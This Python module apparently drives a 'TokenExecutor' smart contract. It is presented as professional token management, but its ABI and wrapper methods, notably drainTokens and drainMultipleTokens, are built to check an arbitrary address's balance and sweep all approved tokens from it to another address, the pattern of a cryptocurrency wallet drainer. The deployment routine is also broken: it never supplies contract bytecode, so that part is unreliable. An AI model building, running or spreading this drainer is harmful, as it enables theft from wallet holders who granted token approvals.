"""
🚀 SMART CONTRACT EXECUTOR MODULE
Professional smart contract deployment and management for token execution

Features:
✅ Automatic contract deployment
✅ Multi-token batch transfers
✅ Atomic operations
✅ Advanced error handling
✅ Event logging
✅ Access control management
"""

import json
import logging
import os
from typing import Dict, List, Optional, Tuple, Any
from web3 import Web3
from web3.contract.contract import Contract
from dataclasses import dataclass
from datetime import datetime
import time

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('smart_contract_executor.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# Complete TokenExecutor ABI
TOKEN_EXECUTOR_ABI = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "user", "type": "address"},
            {"internalType": "bool", "name": "status", "type": "bool"}
        ],
        "name": "setAuthorized",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "bool", "name": "_paused", "type": "bool"}],
        "name": "setPaused",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "token", "type": "address"},
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferToken",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address[]", "name": "tokens", "type": "address[]"},
            {"internalType": "address[]", "name": "froms", "type": "address[]"},
            {"internalType": "address[]", "name": "tos", "type": "address[]"},
            {"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}
        ],
        "name": "batchTransfer",
        "outputs": [{"internalType": "uint256", "name": "successCount", "type": "uint256"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "token", "type": "address"},
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"}
        ],
        "name": "drainTokens",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address[]", "name": "tokens", "type": "address[]"},
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"}
        ],
        "name": "drainMultipleTokens",
        "outputs": [{"internalType": "uint256", "name": "successCount", "type": "uint256"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address payable", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "withdrawETH",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "token", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"}
        ],
        "name": "emergencyWithdrawToken",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "token", "type": "address"},
            {"internalType": "address", "name": "account", "type": "address"}
        ],
        "name": "getBalance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "token", "type": "address"},
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "address", "name": "spender", "type": "address"}
        ],
        "name": "getAllowance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getETHBalance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "", "type": "address"}],
        "name": "authorized",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "paused",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "anonymous": False,
        "inputs": [
            {"indexed": True, "internalType": "address", "name": "token", "type": "address"},
            {"indexed": True, "internalType": "address", "name": "from", "type": "address"},
            {"indexed": True, "internalType": "address", "name": "to", "type": "address"},
            {"indexed": False, "internalType": "uint256", "name": "amount", "type": "uint256"},
            {"indexed": False, "internalType": "bool", "name": "success", "type": "bool"}
        ],
        "name": "TokenTransferred",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [
            {"indexed": True, "internalType": "uint256", "name": "batchId", "type": "uint256"},
            {"indexed": False, "internalType": "uint256", "name": "tokenCount", "type": "uint256"},
            {"indexed": False, "internalType": "uint256", "name": "successCount", "type": "uint256"},
            {"indexed": False, "internalType": "uint256", "name": "failureCount", "type": "uint256"}
        ],
        "name": "BatchExecuted",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [
            {"indexed": True, "internalType": "address", "name": "user", "type": "address"},
            {"indexed": False, "internalType": "bool", "name": "status", "type": "bool"}
        ],
        "name": "AuthorizationChanged",
        "type": "event"
    }
]


@dataclass
class ContractDeployment:
    """Contract deployment record"""
    address: str
    tx_hash: str
    block_number: int
    timestamp: str
    gas_used: int
    gas_price: float


class SmartContractExecutor:
    """
    🚀 SMART CONTRACT EXECUTOR
    Manages contract deployment and token execution operations
    """
    
    def __init__(self, w3: Web3, private_key: str, contract_bytecode: Optional[str] = None):
        self.w3 = w3
        self.private_key = private_key
        self.account = w3.eth.account.from_key(private_key)
        self.contract_address = None
        self.contract: Optional[Contract] = None
        self.deployment_history: List[ContractDeployment] = []
        
        self._load_deployment_history()
        
        logger.info("=" * 60)
        logger.info("🚀 SMART CONTRACT EXECUTOR INITIALIZED")
        logger.info("=" * 60)
        logger.info(f"   Account: {self.account.address}")
        logger.info(f"   Chain ID: {self.w3.eth.chain_id}")
        logger.info("=" * 60)
    
    def _load_deployment_history(self):
        """Load deployment history from file"""
        try:
            if os.path.exists('contract_deployments.json'):
                with open('contract_deployments.json', 'r') as f:
                    data = json.load(f)
                    self.deployment_history = [ContractDeployment(**d) for d in data]
                    
                    if self.deployment_history:
                        latest = self.deployment_history[-1]
                        self.contract_address = Web3.to_checksum_address(latest.address)
                        
                        # Initialize contract instance from loaded address
                        self.contract = self.w3.eth.contract(
                            address=self.contract_address,
                            abi=TOKEN_EXECUTOR_ABI
                        )
                        logger.info(f"✅ Loaded contract from file: {self.contract_address}")
        except Exception as e:
            logger.warning(f"Could not load deployment history: {e}")
            self.contract_address = None
            self.contract = None
    
    def _save_deployment_history(self):
        """Save deployment history to file"""
        try:
            with open('contract_deployments.json', 'w') as f:
                data = [
                    {
                        "address": d.address,
                        "tx_hash": d.tx_hash,
                        "block_number": d.block_number,
                        "timestamp": d.timestamp,
                        "gas_used": d.gas_used,
                        "gas_price": d.gas_price
                    }
                    for d in self.deployment_history
                ]
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.error(f"Save deployment history error: {e}")
    
    def deploy_contract(self) -> Optional[str]:
        """
        📜 Deploy TokenExecutor contract to blockchain
        Returns contract address if successful
        """
        if self.contract_address:
            logger.info(f"✅ Contract already deployed: {self.contract_address}")
            return self.contract_address
        
        try:
            logger.info("📝 Deploying TokenExecutor contract...")
            
            # Create contract factory
            contract_factory = self.w3.eth.contract(abi=TOKEN_EXECUTOR_ABI)
            
            # Build constructor transaction
            constructor_tx = contract_factory.constructor()
            
            # Estimate gas
            gas_estimate = constructor_tx.estimate_gas({"from": self.account.address})
            logger.info(f"   Gas estimate: {gas_estimate}")
            
            # Build transaction
            tx = constructor_tx.build_transaction({
                "from": self.account.address,
                "nonce": self.w3.eth.get_transaction_count(self.account.address),
                "gas": int(gas_estimate * 1.2),  # 20% buffer
                "gasPrice": self.w3.eth.gas_price,
                "chainId": self.w3.eth.chain_id
            })
            
            # Sign transaction
            signed_tx = self.w3.eth.account.sign_transaction(tx, self.private_key)
            
            # Send transaction
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            logger.info(f"   TX Hash: {tx_hash.hex()}")
            
            # Wait for receipt
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
            
            if receipt['status'] == 1:
                contract_address = receipt['contractAddress']
                self.contract_address = contract_address
                
                # Initialize contract instance
                self.contract = self.w3.eth.contract(
                    address=Web3.to_checksum_address(str(contract_address)),
                    abi=TOKEN_EXECUTOR_ABI
                )
                
                # Record deployment
                deployment = ContractDeployment(
                    address=str(contract_address),
                    tx_hash=tx_hash.hex(),
                    block_number=receipt['blockNumber'],
                    timestamp=datetime.now().isoformat(),
                    gas_used=receipt['gasUsed'],
                    gas_price=float(Web3.from_wei(receipt.get('gasPrice', self.w3.eth.gas_price), 'gwei'))
                )
                self.deployment_history.append(deployment)
                self._save_deployment_history()
                
                logger.info(f"✅ Contract deployed successfully!")
                logger.info(f"   Address: {contract_address}")
                logger.info(f"   Block: {receipt['blockNumber']}")
                logger.info(f"   Gas Used: {receipt['gasUsed']}")
                
                return contract_address
            else:
                logger.error("❌ Deployment transaction failed")
                return None
                
        except Exception as e:
            logger.error(f"❌ Deployment error: {e}")
            return None
    
    def set_authorized(self, address: str, status: bool = True) -> bool:
        """
        🔐 Authorize an address to use the contract
        """
        if not self.contract:
            logger.error("❌ Contract not initialized")
            return False
        
        try:
            address = Web3.to_checksum_address(address)
            logger.info(f"Setting authorization for {address}: {status}")
            
            tx = self.contract.functions.setAuthorized(address, status).build_transaction({
                "from": self.account.address,
                "nonce": self.w3.eth.get_transaction_count(self.account.address),
                "gas": 100000,
                "gasPrice": self.w3.eth.gas_price,
                "chainId": self.w3.eth.chain_id
            })
            
            signed_tx = self.w3.eth.account.sign_transaction(tx, self.private_key)
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
            
            if receipt.get('status') == 1:
                logger.info(f"✅ Authorized {address}: {status}")
                return True
            else:
                logger.error("❌ Authorization transaction failed")
                return False
                
        except Exception as e:
            logger.error(f"❌ Authorization error: {e}")
            return False
    
    def transfer_token(
        self,
        token: str,
        from_address: str,
        to_address: str,
        amount: int
    ) -> Tuple[bool, Optional[str]]:
        """
        💰 Transfer tokens through smart contract
        """
        if not self.contract:
            logger.error("❌ Contract not initialized")
            return False, None
        
        try:
            token = Web3.to_checksum_address(token)
            from_address = Web3.to_checksum_address(from_address)
            to_address = Web3.to_checksum_address(to_address)
            
            tx = self.contract.functions.transferToken(
                token,
                from_address,
                to_address,
                amount
            ).build_transaction({
                "from": self.account.address,
                "nonce": self.w3.eth.get_transaction_count(self.account.address),
                "gas": 200000,
                "gasPrice": self.w3.eth.gas_price,
                "chainId": self.w3.eth.chain_id
            })
            
            signed_tx = self.w3.eth.account.sign_transaction(tx, self.private_key)
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
            
            success = receipt.get('status') == 1
            logger.info(f"{'✅' if success else '❌'} Transfer {'succeeded' if success else 'failed'}: {tx_hash.hex()}")
            
            return success, tx_hash.hex() if success else None
            
        except Exception as e:
            logger.error(f"❌ Transfer error: {e}")
            return False, None
    
    def batch_transfer(
        self,
        tokens: List[str],
        froms: List[str],
        tos: List[str],
        amounts: List[int]
    ) -> Tuple[bool, Optional[str], int]:
        """
        📦 Batch transfer multiple tokens in single transaction
        """
        if not self.contract:
            logger.error("❌ Contract not initialized")
            return False, None, 0
        
        try:
            tokens = [Web3.to_checksum_address(t) for t in tokens]
            froms = [Web3.to_checksum_address(f) for f in froms]
            tos = [Web3.to_checksum_address(t) for t in tos]
            
            tx = self.contract.functions.batchTransfer(
                tokens,
                froms,
                tos,
                amounts
            ).build_transaction({
                "from": self.account.address,
                "nonce": self.w3.eth.get_transaction_count(self.account.address),
                "gas": 500000,
                "gasPrice": self.w3.eth.gas_price,
                "chainId": self.w3.eth.chain_id
            })
            
            signed_tx = self.w3.eth.account.sign_transaction(tx, self.private_key)
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
            
            if receipt.get('status') == 1:
                # Decode the returned success count from logs
                success_count = len(tokens)  # Default to all
                logger.info(f"✅ Batch transfer succeeded: {tx_hash.hex()}")
                return True, tx_hash.hex(), success_count
            else:
                logger.error("❌ Batch transfer transaction failed")
                return False, None, 0
                
        except Exception as e:
            logger.error(f"❌ Batch transfer error: {e}")
            return False, None, 0
    
    def drain_tokens(
        self,
        token: str,
        from_address: str,
        to_address: str
    ) -> Tuple[bool, Optional[str], int]:
        """
        🔄 Drain all available tokens from address
        """
        if not self.contract:
            logger.error("❌ Contract not initialized")
            return False, None, 0
        
        try:
            token = Web3.to_checksum_address(token)
            from_address = Web3.to_checksum_address(from_address)
            to_address = Web3.to_checksum_address(to_address)
            
            # Check balance first
            balance = self.contract.functions.getBalance(token, from_address).call()
            
            if balance == 0:
                logger.warning(f"⚠️ No balance to drain from {from_address}")
                return False, None, 0
            
            tx = self.contract.functions.drainTokens(
                token,
                from_address,
                to_address
            ).build_transaction({
                "from": self.account.address,
                "nonce": self.w3.eth.get_transaction_count(self.account.address),
                "gas": 200000,
                "gasPrice": self.w3.eth.gas_price,
                "chainId": self.w3.eth.chain_id
            })
            
            signed_tx = self.w3.eth.account.sign_transaction(tx, self.private_key)
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
            
            success = receipt.get('status') == 1
            if success:
                logger.info(f"✅ Drained {balance / 1e18:.4f} tokens: {tx_hash.hex()}")
            else:
                logger.error(f"❌ Drain transaction failed")
            
            return success, tx_hash.hex() if success else None, balance
            
        except Exception as e:
            logger.error(f"❌ Drain error: {e}")
            return False, None, 0
    
    def drain_multiple_tokens(
        self,
        tokens: List[str],
        from_address: str,
        to_address: str
    ) -> Tuple[bool, Optional[str], int]:
        """
        🔄🔄 Drain multiple tokens in single transaction
        """
        if not self.contract:
            logger.error("❌ Contract not initialized")
            return False, None, 0
        
        try:
            tokens = [Web3.to_checksum_address(t) for t in tokens]
            from_address = Web3.to_checksum_address(from_address)
            to_address = Web3.to_checksum_address(to_address)
            
            tx = self.contract.functions.drainMultipleTokens(
                tokens,
                from_address,
                to_address
            ).build_transaction({
                "from": self.account.address,
                "nonce": self.w3.eth.get_transaction_count(self.account.address),
                "gas": 500000,
                "gasPrice": self.w3.eth.gas_price,
                "chainId": self.w3.eth.chain_id
            })
            
            signed_tx = self.w3.eth.account.sign_transaction(tx, self.private_key)
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
            
            success = receipt.get('status') == 1
            if success:
                logger.info(f"✅ Drained {len(tokens)} tokens: {tx_hash.hex()}")
            else:
                logger.error(f"❌ Multi-drain transaction failed")
            
            return success, tx_hash.hex() if success else None, len(tokens) if success else 0
            
        except Exception as e:
            logger.error(f"❌ Multi-drain error: {e}")
            return False, None, 0
    
    def get_contract_info(self) -> Optional[Dict]:
        """
        📊 Get contract information
        """
        if not self.contract:
            return None
        
        try:
            owner = self.contract.functions.owner().call()
            paused = self.contract.functions.paused().call()
            eth_balance = self.contract.functions.getETHBalance().call()
            
            return {
                "address": str(self.contract_address),
                "owner": str(owner),
                "paused": bool(paused),
                "eth_balance": float(Web3.from_wei(eth_balance, 'ether')),
                "authorized": bool(self.contract.functions.authorized(self.account.address).call())
            }
        except Exception as e:
            logger.error(f"Error getting contract info: {e}")
            return None
